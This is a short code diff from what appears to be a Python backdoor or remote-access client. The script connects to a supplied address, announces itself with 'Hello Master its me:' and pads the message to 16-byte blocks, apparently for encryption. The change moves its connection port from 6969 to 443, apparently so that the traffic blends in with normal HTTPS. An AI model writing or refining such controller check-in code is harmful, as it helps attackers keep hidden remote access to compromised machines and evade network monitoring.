@@ -10,7 +10,7 @@ def main(dst):
   ipaddr = dst
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-  sock.connect ((ipaddr, 6969))
+  sock.connect ((ipaddr, 443))
   #Send initial connection message
   cmd = "Hello Master its me: " + ipaddr
   if (len(cmd) % 16 != 0):
